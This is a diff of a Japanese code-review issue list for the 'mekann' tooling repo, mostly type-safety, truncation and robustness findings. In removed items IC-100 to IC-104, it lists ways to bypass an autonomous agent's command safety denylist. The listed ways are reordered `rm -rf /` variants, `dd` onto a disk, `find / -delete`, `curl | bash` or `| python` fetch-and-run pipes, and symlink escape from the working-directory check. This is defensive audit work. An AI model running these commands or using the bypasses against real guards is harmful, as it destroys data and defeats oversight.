-- **概要**: pi の `registerTool` は TypeBox(zod) schema を `parameters` に受け取るが、`execute(id, params, ...)` の `params` は `unknown` 型で渡ってくる。各 handler は「schema で検証済」と想定して `(params as any).xxx` でフィールドを取り出す。schema と handler のフィールド名が乖離しても型チェックで検知できず、実行時に `undefined` を黙って使う。`Number()`/`Boolean()`/`String()` で都度キャストするボイラプレートも大量。
-- **根拠**: output-gate 1関数内で `params as any` が14回、ledger も同様。
-- **提案**: `parseParams<T>(schema, params): T` のような型付きデコーダを共通化し、各 handler は `const p = parseParams(SearchSchema, params); p.query` で型安全に。schema から TypeScript 型を生成(`Type.Static<typeof Schema>`)。
-
-### IC-047 `toolsRegistration.ts` が TypeBox スキーマ生成を `as any` で誤魔化す
-- **カテゴリ**: 型安全性 / API 設計
-- **対象**: `mekann/autonomy/autoresearch/toolsRegistration.ts:44,47,48,50,53,69,72,112,121`
-- **概要**: `StringEnum([...], { description: ... }) as any` で、`StringEnum` ヘルパの戻り型が TypeBox 期待型と合わないのを `as any` で握り潰している。これはヘルパの型定義が壊れている兆候で、スキーマ検証が実行時に正しく動いているかも怪しい。
-- **提案**: `StringEnum` の戻り型を修正し `as any` を全削除。schema 型の一貫性を型チェックで保証。
 
 ### IC-048 `review-quality` が branch diff と working diff を単純加算 (二重カウント)
 - **カテゴリ**: バグ (計算精度)
@@ -808,7 +625,6 @@
 
 ### IC-052 各 workspace に tsconfig.json が無い (型チェック分散)
 - **カテゴリ**: 型安全性 / 整理
-- **対象**: `mekann/context/output-gate/tsconfig.json`, `mekann/context/ledger/tsconfig.json`, `mekann/autonomy/autoresearch/tsconfig.json` など多数が不在
 - **概要**: workspace ごとの tsconfig が無く、`tsc -p tsconfig.prod.json`(ルート) のみで型チェックされる。workspace 単位で `npm test`/`typecheck` を走らせても型チェックが含まれない場合がある。エディタで workspace を開いたときの型解決も不安定。
 - **提案**: 各 workspace にルートを extend する `tsconfig.json` を配置。`typecheck` スクリプトを各 workspace に統一。
 
@@ -861,16 +677,6 @@
 - **概要**: `process.env.PI_CODEX_WEB_SEARCH_CLIENT_VERSION ?? DEFAULT_CLIENT_VERSION` で環境変数からクライアント版を自由に設定可能。悪意/誤設定で未来の API 版を叩いて予期せぬ挙動やレート制限を招く恐れ。dev 用とはいえドキュメント化されていない隠しノブ。
 - **提案**: 当該 env のドキュメント化、または dev/CI 限定のフラグで制限。本番では固定。
 
-### IC-060 autoresearch `queryEvaluation/pipeline.ts` のリスク検出正規表現が日本語混在で脆い
-- **カテゴリ**: 堅牢性 / 国際化
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/pipeline.ts:40-52` (`detectRiskFlags`)
-- **概要**: `/\b(secret|token|...|秘密|認証情報)\b/` のように単語境界 `\b` を使いつつ日本語(秘密/認証情報)を含む。`\b` は ASCII 単語境界なので、日本語前後ではマッチしない(例: 「本番の秘密」の「秘密」は `\b` で境界判定されにくい)。結果として日本語クエリのリスク検出が抜ける。`本番db` のような複合語も `\b` と相性が悪い。
-- **提案**: 日本語には `\b` を使わず、前方後方 lookaround で文字種境界を判定するか、単に `/(secret|token|...|秘密|認証情報)/` に緩和。プロパティテストで日本語クエリを網羅。
-
----
-
-## 第8バッチ (探索継続)
-
 ### IC-061 `grep.ts` のフラグ検出正規表現が過剰マッチ (フラグ重複/欠落バグ)
 - **カテゴリ**: バグ (確定)
 - **対象**: `mekann/context/command-normalization/grep.ts:14-26`
@@ -917,7 +723,7 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 ### IC-067 `modes` 拡張が `safeEmit` でイベント失敗を握り潰し (サイレント機能不全)
 - **カテゴリ**: デバッグ性
 - **対象**: `mekann/safety/modes/index.ts:28-29, 290-292`
-- **概要**: `safeEmit` とロード時の `try { ... } catch { /* events not available */ }` で、sandbox/autoresearch 拡張が未ロード時のイベント発火失敗を無言化。設計意図(拡張の疎結合)は理解できるが、本番でイベントリスナが壊れた場合(タイポ、API 変更)に「モード遷移したのに sandbox プロファイルが変わらない」等が無言で起きる。
+- **概要**: `safeEmit` とロード時の `try { ... } catch { /* events not available */ }` で、sandbox拡張が未ロード時のイベント発火失敗を無言化。設計意図(拡張の疎結合)は理解できるが、本番でイベントリスナが壊れた場合(タイポ、API 変更)に「モード遷移したのに sandbox プロファイルが変わらない」等が無言で起きる。
 - **提案**: デバッグログまたはメトリクス出力。初回失敗時のみ `ctx.ui.notify` で軽く警告。
 
 ---
@@ -933,7 +739,7 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 
 ### IC-069 `issue/worktree.removeWorktree` の `rmSync(recursive)` はガード付きだが候補側(IC-039)と安全度が不整合
 - **カテゴリ**: 一貫性 / セーフティ
-- **対象**: `mekann/utils/issue/worktree.ts:132-147` vs `mekann/autonomy/autoresearch/candidate.ts:192` (IC-039)
+- **対象**: `mekann/utils/issue/worktree.ts:132-147`
 - **概要**: `removeWorktree` は `isRegisteredWorktree(repoRoot, wt)` + `isExpectedWorktree(path, branch)` の二重チェックを経てから `rmSync` する堅牢設計。一方 `candidate.ts removeCandidateWorktree`(IC-039)は `c.trial?.worktree_path` を JSON から読んでガード無しで `rmSync`。同じ「ワークツリー削除」で安全度がバラバラ。
 - **提案**: 共通の `safeRemoveWorktree(repoRoot, { path, branch, expectedRootPrefix })` ヘルパに集約。candidate 側も issue 側と同等のガードを適用。
 
@@ -942,18 +748,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 - **対象**: `mekann/utils/issue/worktree.ts:96-122`
 - **概要**: `branch` と `worktreePath` を `execFileSync("git", ["worktree", "add", ...])` の引数として渡す。`execFileSync` はシェルを経由しないのでコマンドインジェクションは無いが、`branch` に `../` や絶対パスが入ると git の ref 解釈で意図しないブランチ操作、`worktreePath` に絶対パスが入るとリポジトリ外へワークツリー作成になる。`branch = "issue-" + issueNumber` 由来なら数値保証だが、呼び出し経路によってはユーザ入力到達の恐れ。
 - **提案**: branch 名は `refs/heads/` プレフィックス強制または `git check-ref-format` で検証。`worktreePath` は期待プレフィックス(`.pi-worktrees/` 等)内であることを assert。
-
-### IC-071 `autoresearch/layout.ts writeGeneratedFileSafe` が `.new` を残して throw (ゴミ文件)
-- **カテゴリ**: 堅牢性 / リポジトリ衛生
-- **対象**: `mekann/autonomy/autoresearch/layout.ts:186-192`
-- **概要**: 生成マーカー無しファイル衝突時、`fs.writeFileSync(fp + ".new", content, ...)` してから throw。「ユーザに `.new` を見て手動マージして」という意図だが、`.new` が `.gitignore` 対象外で Git に pickup され、複数回実行で蓄積する。`updateGeneratedBlockSafe` も同様。
-- **提案**: `.new` を `.gitignore` に追加、または一時ディレクトリ(`.autoresearch/pending/`)に隔離。衝突解決手順をメッセージに明示。
-
-### IC-072 `autoresearch/layout.ts readState` が破損 state.json を初期状態で黙置換
-- **カテゴリ**: データ整合性
-- **対象**: `mekann/autonomy/autoresearch/layout.ts:88-90`
-- **概要**: `try { return JSON.parse(readFileSync(statePath)); } catch { return { version: 2, updatedAt: ... }; }` で、state.json のパース失敗(破損/部分的書き込み)を**空のデフォルト**で置き換える。呼び出し側は「正しい状態」と信じて currentPlanPath 等を再構築し、既存 plan への参照が失われる。IC-040(非アトミック書き込み)と合わさると破損→黙リセット→データ損失の連鎖。
-- **提案**: 破損時は throw または `.corrupt.<ts>` に退避して人間の判断を仰ぐ。バックアップ世代(IC-017 の rotate)を state.json にも適用。
 
 ### IC-073 `autopilot` の `appearTimeoutMs: 30_000` と `maxLaunchAttempts: 3` が固定 (環境依存)
 - **カテゴリ**: 堅牢性 / 設定可能性
@@ -1068,7 +862,7 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 ### IC-090 `kitty/control.ts` の `kitty @ ls` タイムアウトが 2000ms 固定 (低速環境で空振り)
 - **カテゴリ**: 堅牢性
 - **対象**: `mekann/utils/terminal/kitty/control.ts:310, 383`
-- **概要**: `execFile(this.kittenBin, ["@", "ls"], { timeout: 2000 })` が2箇所。多数ウィンドウ、重い kitty、リモート X 転送では 2s でタイムアウトし、空配列に落ちて「ワーク Pi ペーン無し」と誤判定(autoresearch/autopilot の `hasActiveWorkPi` に直結)。呼び出し側はタイムアウトと「ペーン無し」を区別できない。
+- **概要**: `execFile(this.kittenBin, ["@", "ls"], { timeout: 2000 })` が2箇所。多数ウィンドウ、重い kitty、リモート X 転送では 2s でタイムアウトし、空配列に落ちて「ワーク Pi ペーン無し」と誤判定（autopilot の `hasActiveWorkPi` に直結）。呼び出し側はタイムアウトと「ペーン無し」を区別できない。
 - **提案**: タイムアウトを設定可能に(env/setting)、タイムアウト時は「不明」状態を返して呼び出し側が再試行できるように。
 
 ---
@@ -1092,18 +886,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 - **対象**: `mekann/utils/codex-web-search/stream.ts:25-40`
 - **概要**: ループ内で `\n\n` 区切りでフレームを切り出し、ループ後に `buffer += decoder.decode(); const event = parseSseFrame(buffer);` で残りを処理。もしストリームが `\n\n` で終わっていた場合、ループ内で最終フレームが処理済みで buffer は空だが、**空文字列の `parseSseFrame("")`** が呼ばれる(`dataLines.length === 0` で undefined を返すので実害は無いが、無駄)。逆に `\n\n` 無しで終わった場合は最終フレームが処理される。Edge: サーバが `data: x\n\n` を送り、Reader が `done` を返した直後に buffer が `""` ではなく `"\n"` 等を保持すると挙動が曖昧。
 - **提案**: 最終処理前に `if (buffer.trim())` ガード。プロパティテストでランダムチャンク分割を網羅。
-
-### IC-094 `queryEvaluation/rules.ts` の `require` 条件が `上げ|改善|向上` の語形変化に脆い
-- **カテゴリ**: 堅牢性 / 国際化
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/rules.ts:65,79` (`require: /(上げ|改善|向上)/`)
-- **概要**: スコア/カバレッジ系メトリックの推論に「上げ/改善/向上」のいずれかを要求するが、命令形の揺れ(`上げたい`/`上げて`/`高く`/`向上させ`/`改善します`/`ベースアップ`)や、肯定表現(`良くする`/`増やす`/`上げ`)を取りこぼす。「速く」は latency で拾うが score 系は狭い。IC-060 と同じ日本語正規表現の脆さが点在。
-- **提案**: 日本語の活用語尾を包括するパターン(`上げ|上げたい|上げて|高く|向上|改善|良く|増や`)、または形態素解析ベースに切り替え。テストコーパスを拡充。
-
-### IC-095 `queryEvaluation/measurementRules.ts` の metric 行検出が `\b` 依存 (IC-060 同根)
-- **カテゴリ**: 堅牢性 / 国際化
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/measurementRules.ts:11` (`/\bmetric\s+[\w.-]+\s*=/i`)
-- **概要**: `metric xxx = 123` 形式の stdout 行検出。`\b` は ASCII 境界なので「メトリック latency_ms = 100」の日本語前後ではマッチしない。`stdout|標準出力` は日本語を含むが `metric` は `\bmetric\b` で英語のみ。日本語ドキュメント内の `metric` 言及が抜ける。
-- **提案**: `\b` を外すか `(?:^|\s|動詞)` の文脈マッチ。IC-060/IC-094 と合わせて「日本語クエリのルール検出」を一括整顿するタスクに。
 
 ### IC-096 `ledger projection.ts summarizeSessionContextText` が `unknown` 入力を `clampInt` で握る
 - **カテゴリ**: 堅牢性 / 型安全性
@@ -1133,43 +915,11 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 
 ## 第13バッチ (探索継続)
 
-### IC-100 autoresearch `validateCommandSafety` の `rm -rf /` 検出が容易にバイパス可能 (セキュリティ)
-- **カテゴリ**: セキュリティ (確定バイパス)
-- **対象**: `mekann/autonomy/autoresearch/contractV1/safety.ts:212-216`
-- **概要**: `if (cmd.argv[0] === "rm" && cmd.argv.includes("-rf") && (cmd.argv.includes("/") || cmd.argv.includes("/*")))` で `rm -rf /` を検出するが、**多数の等価な破壊的表現を逃す**:
-  - `rm -fr /`(フラグ順序逆)→ バイパス
-  - `rm -r -f /`(フラグ分割)→ バイパス
-  - `rm --recursive --force /`(ロングオプション)→ バイパス
-  - `rm -rf /*` は検出するが `rm -rf /home` `rm -rf /etc` 等の他の絶対パス破壊は素通り
-  - `rm -rf .` `rm -rf ~`(リポジトリ/HOME 全消去)は対象外
-  - `find / -delete` `dd if=/dev/zero of=/dev/sda` 等の別コマンド系は無対象
-- **検証**: `node` で `/^rm\s+-rf\s+\//` 等のバリアント評価済み(上記 FALSE になるケースを確認)。
-- **提案**: `rm` のフラグ正規化(`-rf`/`-fr`/`-r -f`/`--recursive --force` を等価扱い)、ターゲットパスが絶対パスまたは危険な広範囲(`/`/`/*`/`/home`/`/etc`/`~`/`.`)なら拒否。`find -delete`/`dd`/`mkfs` 等も別途ガード。
-
-### IC-101 autoresearch `curl|sh` 検出が `bash`/他シェルを抜く
-- **カテゴリ**: セキュリティ
-- **対象**: `mekann/autonomy/autoresearch/contractV1/safety.ts:205-208`
-- **概要**: `/curl.*\|.*sh|wget.*\|.*sh/` は `sh` で終わるパイプのみ検出。`curl x | bash` `curl x | zsh` `curl x | python` `curl x | perl` は**マッチしない**(`sh` 部分一致だと `bash` はヒットするが `python`/`perl`/`node` は抜ける)。また `curl x > /tmp/a; sh /tmp/a`(リダイレクト経由)も抜ける。
-- **検証**: `node` で `/curl.*\|.*sh/.test("curl http://x | bash")` → 一応 true(`sh` が `bash` 内に部分一致)、しかし `/curl.*\|.*python/.test("curl x | python")` → false。
-- **提案**: `sh`/`bash`/`zsh`/`fish`/`python`/`perl`/`node`/`ruby` 等のインタプリタ群を包括。リダイレクト経由(`> file; shell file`)も検出。
-
 ### IC-102 `shellArgs` が shell-mode terminal アクションで `-lc` を使う (セキュリティと pi-session 修正の精神の不整合)
 - **カテゴリ**: セキュリティ / 一貫性
 - **対象**: `mekann/utils/terminal/actions.ts:14-25`
 - **概要**: `terminal-shortcuts` の `mode: "shell"` アクションは `shellArgs` 経由で `[shell, "-lc", command]` を構築し `spawnSync` に渡す。`command` は `MEKANN_TERMINAL_SHORTCUTS` env 由来(IC-068 でパース問題有)でユーザ設定可能。CHANGELOG の直近修正(`pi-session.ts` で sh 文字列結合を廃止し argv 直渡しに)と対照的に、shortcuts 経路はまだシェル文字列実行。env に細工されたコマンドがそのままシェルで走る。
 - **提案**: shortcuts の `mode: "shell"` を非推奨とし `mode: "argv"` を推奨。`shell` モードを使う場合はコマンドをトークン分解して argv 化、または明示的な危険コマンド検出。
-
-### IC-103 `validateCommandSafety` の `cwd` エスケープ検出がシンボリックリンクを考慮しない
-- **カテゴリ**: セキュリティ / 堅牢性
-- **対象**: `mekann/autonomy/autoresearch/contractV1/safety.ts:218-232`
-- **概要**: `resolved !== root && !resolved.startsWith(root + path.sep)` で文字列プレフィックス判定。`cwd` が `link-to-outside`(シンボリックリンクで repo 外を指す)の場合、`path.resolve` はシンボリックリンクを解決せず文字列結合のみ。`fs.realpathSync` すればリンク先が repo 外だと分かるが、現状は素通り。`..` チェックはあるがリンク経由の脱出は無対策。
-- **提案**: `fs.realpathSync(path.resolve(repoRoot, cwd))` で実体パスを解決してから比較。リンク解決失敗(存在しない)のケースも想定。
-
-### IC-104 autoresearch `safety.ts` の危険パターンが文字列 regex のみ (ASTベースでない)
-- **カテゴリ**: セキュリティ / 限界
-- **対象**: `mekann/autonomy/autoresearch/contractV1/safety.ts:260-290` (`DEFAULT_FORBIDDEN_COMMAND_PATTERNS`)
-- **概要**: `autoresearch_run`(`bash -c <string>`)向けの禁止パターンが regex 文字列リスト(`\bsudo\b`, `\brm\s+-rf\s+/` 等)。IC-100/IC-101 で示した通り regex ベースはエスケープ容易(空白・クオート・変数展開・`eval`/`$()` 等)。真に堅牢にするには sh 構文木解析が必要だが、現状は文字列マッチに依存。
-- **提案**: 短期的には regex を強化(フラグ正規化、変数展開 `$(...)`/`\` `...\`` の禁止)、中長期的には `shell-quote` 等でパースして AST レベルで評価。trusted ユーザ限定でも事故防止に有用。
 
 ### IC-105 `terminal actions.ts` が `process.env.SHELL || "/bin/sh"` でログインシェルを信用
 - **カテゴリ**: セキュリティ / 堅牢性
@@ -1286,12 +1036,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 - **テストの抜け**: `index.test.ts:55-72` は「文字化けしないこと」は検証するが、「`maxBytes` を超過しないこと」を**検証しない**。バグがテストを素通り。
 - **提案**: バイト正確なカット(`truncate-utils` の `findByteBoundaryFromEnd` の修正版 IC-053 と統合)、または `Buffer.byteLength` で二分探索。テストに「`expect(byteLength(result)) <= maxBytes * K`」のプロパティ追加。
 
-### IC-122 autoresearch `runner.truncateTail` が `truncate-utils` に委譲せず独自ラップ (重複)
-- **カテゴリ**: 重複コード / 整理
-- **対象**: `mekann/autonomy/autoresearch/runner.ts:171-173`
-- **概要**: `export function truncateTail(text, maxLines, maxBytes) { return truncateTailShared(text, {maxLines, maxBytes}).content; }` と、`truncate-utils` の同名関数を薄くラップするだけ。`truncate-utils` は IC-053 で `findByteBoundaryFromEnd` にバグを抱えるが、autoresearch 側はそのバグをそのまま継承。直接 import で十分なラッパー層が無駄。
-- **提案**: 呼び出し側で `truncate-utils` を直接 import し、ラッパ廃止。IC-053 修正が両方に効くように。
-
 ### IC-123 `model-optimizer metrics` の `pendingAssistantStart` が module-level mutable (並行リスク)
 - **カテゴリ**: 堅牢性 / 並行性
 - **対象**: `mekann/core/model-optimizer/metrics.ts:20` (`let pendingAssistantStart`)
@@ -1367,14 +1111,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 
 ## 第18バッチ (探索継続)
 
-### IC-134 🔴 秘密マスキングが 2つの実装で保護度が大きく異なる (autoresearch 側が脆弱)
-- **カテゴリ**: セキュリティ (確定) — IC-003 の深化
-- **対象**:
-  - `mekann/context/tool-output/redact.ts` (8 パターン: AWS `AKIA`/GitHub `ghp_`/OpenAI `sk-`/Anthropic `sk-ant-`/env SECRET 等) — output-gate 使用
-  - `mekann/autonomy/autoresearch/runner.ts:179-185` `filterSecrets` (2 パターンのみ) — autoresearch の **stdout/stderr/command/checks** 出力全てに使用(`runner.ts:291,298,706,712,747,750,755-757`、`tools/run.ts:284,316,345`)
-- **概要**: 同一リポジトリに 2つの秘密マスキング実装が存在し、**autoresearch 側は圧倒的に弱い**(IC-003 で指摘済みの 2 パターンのみ)。autoresearch のベンチマーク/チェック実行で AWS キー・GitHub PAT・OpenAI キーが stdout に出力されると、`filterSecrets` はそれらを**マスクせず** `.autoresearch/plans/*/runs/*/stdout.log` に平文で保存する。一方 output-gate は同じキーを確実にマスク。 CONTEXT.md の「Safety guardrail」「Output gate」用語と整合しない保護格差。
-- **提案**: `filterSecrets` を廃止し `tool-output/redact.ts` の `redactSecrets` に一本化。autoresearch の全出力経路(stdout/stderr/command/logs)で `redactSecrets` を適用。プロパティテストで両実装の出力を比較し格差ゼロを保証。
-
 ### IC-135 `output-gate search.ts capText` の UTF-8 末端処理が不完全
 - **カテゴリ**: バグ (エッジケース) / 国際化
 - **対象**: `mekann/context/output-gate/search.ts:33-36`
@@ -1409,8 +1145,8 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 ### IC-140 `output-gate saveArtifact` の `appendFile` が非アトミック (IC-017/IC-036 と同根)
 - **カテゴリ**: データ整合性 / 並行性
 - **対象**: `mekann/context/output-gate/store.ts:232` (`await fsp.appendFile(manifestPath, line)`)
-- **概要**: manifest.jsonl への追記が `appendFile` のみでロック無し。複数 pi プロセス(または subagent 子 pi)が同時にアーティファクト保存すると、manifest 行が混線し、`readManifest` の `JSON.parse` が壊れた行をスキップ(`store.ts:271` の `catch { /* skip corrupt jsonl */ }`)。結果としてアーティファクトは存在するのに manifest に載らず、検索(`searchToolOutputs`)で見つからない。IC-017(ledger)/IC-036(autoresearch)と同じ「並列書き込みの行混線」問題の第3の実例。
-- **提案**: 共通のアトミック追記ヘルパ(ロック + rename)を `output-gate`/`ledger`/`autoresearch` の3経路に適用。CONTEXT.md の「Context ledger」「Output gate」両用語の実装が一致するよう。
+- **概要**: manifest.jsonl への追記が `appendFile` のみでロック無し。複数 pi プロセス(または subagent 子 pi)が同時にアーティファクト保存すると、manifest 行が混線し、`readManifest` の `JSON.parse` が壊れた行をスキップ(`store.ts:271` の `catch { /* skip corrupt jsonl */ }`)。結果としてアーティファクトは存在するのに manifest に載らず、検索(`searchToolOutputs`)で見つからない。IC-017（ledger）と同じ「並列書き込みの行混線」の実例。
+- **提案**: 共通のアトミック追記ヘルパ（ロック + rename）を `output-gate`/`ledger` の2経路に適用。CONTEXT.md の「Context ledger」「Output gate」両用語の実装が一致するよう。
 
 ---
 
@@ -1427,18 +1163,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 - **対象**: `mekann/utils/terminal/startup-clear.ts:11`
 - **概要**: `process.stdout.write("\x1b[2J\x1b[H")` で画面クリア + ホーム移動。`\x1b[2J` は**scrollback も含めて消去**する端末エミュレータが多い(kitty/iTerm2 は消去、tmux は設定依存)。起動直前のユーザ出力(直前のセッション履歴、エラーログ)が消失。`clearOnStartup` で無効化可能だがデフォルト有効。
 - **提案**: scrollback を保持する `\x1b[H\x1b[2J`(カーソル以下のみ)や `\x1b[3J`(scrollback 含む、明示的)の使い分け。または `tput clear` 相当。ADR の「Startup terminal clear」用語で挙動明示。
-
-### IC-143 `contractV1 io.ts readCurrentContract/readLockFile` が検証失敗を null で黙返 (IC-072 同根)
-- **カテゴリ**: データ整合性 / デバッグ性
-- **対象**: `mekann/autonomy/autoresearch/contractV1/io.ts:208-218, 227-237`
-- **概要**: `readCurrentContract`/`readLockFile` が「ファイル不在」「JSON 不正」「スキーマ検証失敗」を全て `return null` で同一視。呼び出し側は「contract が未初期化」なのか「破損」なのか区別できず、破損時は再 init で**古い plan/run履歴を見失う**。IC-072(state.json)・IC-056(manifest)・IC-037 と同じ「黙 null フォールバック」の集大成。
-- **提案**: `Result<T, Err>` 型で「不在/破損/検証失敗」を区別。破損時は `.corrupt.<ts>` 退避。autoresearch の判定証跡保護の観点から重要。
-
-### IC-144 `contractV1 schema.ts validateContractV1` が `(contract.acceptance as any).mode === "manual"` を as any で検査
-- **カテゴリ**: 型安全性 / レガシー互換
-- **対象**: `mekann/autonomy/autoresearch/contractV1/schema.ts:202`
-- **概要**: `if ((contract.acceptance as any).mode === "manual")` で、TypeBox schema が `manual` を禁止しているのに、`as any` で「念のため」残存チェック。V0→V1 マイグレーション時のレガシー拒否ロジックと思われるが、schema が既に弾くなら不要。`as any` が「ここは型がつかない」負債。
-- **提案**: V0 マイグレーション経路を明示的な別関数に切り出し、`validateContractV1` から `as any` を除去。マイグレ後に残存チェックを廃止。
 
 ### IC-145 `modes index.ts readOnlySandboxOverrideToken` が `Math.random` ベース (衝突・予測可能)
 - **カテゴリ**: セキュリティ / 堅牢性
@@ -1471,7 +1195,7 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 ### IC-149 `docs/configuration.md` が22 feature中7しか文書化 (15 feature文書未カバー)
 - **カテゴリ**: ドキュメント / 保守性
 - **対象**: `docs/configuration.md` vs `mekann/settings/registry.ts:30` (22 settingsSchemas)
-- **概要**: `registry.ts` が読み込む設定スキーマは 22(modes/sandbox/goal/subagent/autoresearch/review-fixer/command-normalization/output-gate/context-ledger/context-tracker/cacheable-context/codex-shared/codex-web-search/model-optimizer/terminal/issue/codex-limits/dashboard/zip-repo/terminal-shortcuts/settings-editor/skill-surface)。一方 `docs/configuration.md` の `###` セクションは **7**(Sandbox/Subagent/Command Normalization/Output Gate/Collaboration Modes/Cacheable Context/Codex Web Search)のみ。残り 15 feature(goal/autoresearch/review-fixer/context-ledger/context-tracker/codex-shared/model-optimizer/terminal/issue/codex-limits/dashboard/zip-repo/terminal-shortcuts/settings-editor/skill-surface)の設定が**非文書化**。ユーザは設定エディタ(`/mekann-settings`)無しには何が設定可能か分からず、CHANGELOG の migration note が追えない。
+- **概要**: `registry.ts` が読み込む設定スキーマは 22(modes/sandbox/goal/subagent/review-fixer/command-normalization/output-gate/context-ledger/context-tracker/cacheable-context/codex-shared/codex-web-search/model-optimizer/terminal/issue/codex-limits/dashboard/zip-repo/terminal-shortcuts/settings-editor/skill-surface)。一方 `docs/configuration.md` の `###` セクションは **7**(Sandbox/Subagent/Command Normalization/Output Gate/Collaboration Modes/Cacheable Context/Codex Web Search)のみ。残り 15 feature(goal/review-fixer/context-ledger/context-tracker/codex-shared/model-optimizer/terminal/issue/codex-limits/dashboard/zip-repo/terminal-shortcuts/settings-editor/skill-surface)の設定が**非文書化**。ユーザは設定エディタ(`/mekann-settings`)無しには何が設定可能か分からず、CHANGELOG の migration note が追えない。
 - **提案**: 各 feature の settingsSchema から設定項目を自動抽出して `docs/configuration.md` を生成、または手動で 15 セクション追加。CI で「スキーマ数 > ドキュメント数」を警告。
 
 ### IC-150 `docs/architecture/prompt-control-budget.md` の 50 bullet 目標と実態の乖離検証不足
@@ -1943,46 +1667,6 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 
 ## 第40バッチ (探索継続)
 
-### IC-263 `autoresearch subagentPlanning.ts authorityFromContract` の `max_patch_bytes: 50_000` が config.ts と重複 (IC-064/IC-211 同根)
-- **カテゴリ**: 重複コード / 設計
-- **対象**: `mekann/autonomy/autoresearch/subagentPlanning.ts:19`
-- **概要**: `max_patch_bytes: 50_000` がハードコード。`mekann/config.ts:65` の `MEKANN_SUBAGENT_DEFAULTS.maxPatchBytes = 50_000` と同じ値だが、こちらは参照せず直接数値。config.ts 側のデフォルト変更(将来のパッチサイズ上限調整)が subagentPlanning に伝播せず、proposer サブエージェントの権限が古いまま固定される。CONTEXT.md の「Delegated implementation brief」「Subagent delegation」と整合しない。
-- **提案**: `MEKANN_SUBAGENT_DEFAULTS.maxPatchBytes` を参照。IC-064/IC-211 の「設定の一元化」と統合。
-
-### IC-264 `subagentPlanning.suggestSubagents` の戻り値が `unknown[]` (型安全性)
-- **カテゴリ**: 型安全性
-- **対象**: `mekann/autonomy/autoresearch/subagentPlanning.ts:22, 35`
-- **概要**: `export function suggestSubagents(contract): { scouts: unknown[]; proposers: unknown[]; critics: unknown[] }` で、戻り値の各配列が `unknown[]`。呼び出し元が要素を使う際に再度型アサーションが必要。`scouts[0].task_name` 等のフィールドアクセスが型安全でない。IC-141(as any 廃止)/IC-046(構造化レスポンス)と同根。
-- **提案**: `SubagentSuggestion` 型を定義し `{ scouts: SubagentSuggestion[]; ... }` へ。
-
-### IC-265 `queryEvaluation/evaluate.ts` の objective が 120 char で切り詰め (IC-127/IC-193 同根)
-- **カテゴリ**: 国際化 / バグ (計算精度)
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/evaluate.ts:182-185`
-- **概要**: `trimmed.length > 120 ? trimmed.substring(0, 117) + "..." : trimmed` で char 数カット。日本語 objective は 120 char でもバイト/トークンでは大きく、LLM への prompt 消費で読めない。逆に英語では 120 char は短すぎて目的が途切れる。char = byte でも token でもない(IC-127/IC-143/IC-178/IC-193/IC-220 の CJK バグ群と同根)。
-- **提案**: byte/token ベースのカットに統一。または 120 を設定可能に。
-
-### IC-266 `queryEvaluation/evaluate.ts emptyScores` の `safety: 1` が非ゼロデフォルト (意図不明)
-- **カテゴリ**: 設計 / 場牢性
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/evaluate.ts:152-160`
-- **概要**: empty state の `StaticNumericScores` が `safety: 1` のみ非ゼロ。他のスコア(completeness/measurability/...)は 0。空クエリでも「安全である」と仮定する意図(何もしない = 安全)は読めるが、decision は `needs_rewrite` で「目的不明確」。safety の非ゼロがスコア集計(`computeReadiness`)にどう影響するか、ドキュメント無しに追いにくい。意図せず readiness が高く出る恐れ。
-- **提案**: empty state の safety を 0 にするか、意図をコメント明示。empty と「最低限の安全な実験」を区別。
-
-### IC-267 `queryEvaluation/evaluate.ts` の警告・質問文が日本語ハードコード (i18n/構造化)
-- **カテゴリ**: 国際化 / 設計
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/evaluate.ts:170-179`
-- **概要**: empty state の `blockingIssues`/`warnings`/`suggestedRewrite`/`clarifyingQuestions` が全て日本語ハードコード。「実験の目的が不明確です」「主指標は wall-clock time、テスト成功率、coverage のどれを優先しますか？」等。CONTEXT.md の「Japanese interaction policy」に合致するが、英語ユーザやログ解析(機械処理)には不向き。メッセージ ID とローカライズ層が分離されていない。
-- **提案**: メッセージキー(`block.empty_objective`/`question.metric_priority`)とローカライズ辞書を分離。将来の英語/他言語対応。
-
-### IC-268 `queryEvaluation/evaluate.ts detectRiskFlags` の isDangerous が objective を空にする副作用 (設計)
-- **カテゴリ**: 設計 / 場牢性
-- **対象**: `mekann/autonomy/autoresearch/queryEvaluation/evaluate.ts:181-185`
-- **概要**: `const objective = isDangerous ? "" : (trimmed.length > 120 ? ...) `。risk 検出時は `objective` を**空文字**にする。これは「危険な実験は objective を抽出しない(人間に任せる)」意図だが、(a) 空の objective が下流(contract draft)に伝播して「objective 無しの契約」になり、(b) risk フラグだけでは「何が危険だったか」の文脈が失われる。ユーザに「危険なので客観をマスクした」旨の通知がない。
-- **提案**: objective を空にするのではなく `[redacted: risky objective]` マーカー。または危险度に応じた段階的マスク。
-
----
-
-## 第41バッチ (探索継続)
-
 ### IC-269 🔴 既存の byte-safe `safeUtf8Slice` が 5 つの壊れた truncate サイトで未共有 (IC-143 群の解決策が既に repo 内に存在)
 - **カテゴリ**: 重複コード / バグ (CJK 計算精度) — 🔴高(解決の近道)
 - **対象**: \`mekann/context/output-gate/store.ts:160-191\` (\`safeUtf8Slice\`) vs 5 つの壊れた実装
@@ -2014,7 +1698,7 @@ rm`)を「シンプルコマンド」と誤認し、normalize 対象にしてし
 
 ### IC-271 ~~sanitizeManifestSource 文字列長切り詰め~~ (訂正: 取り下げ)
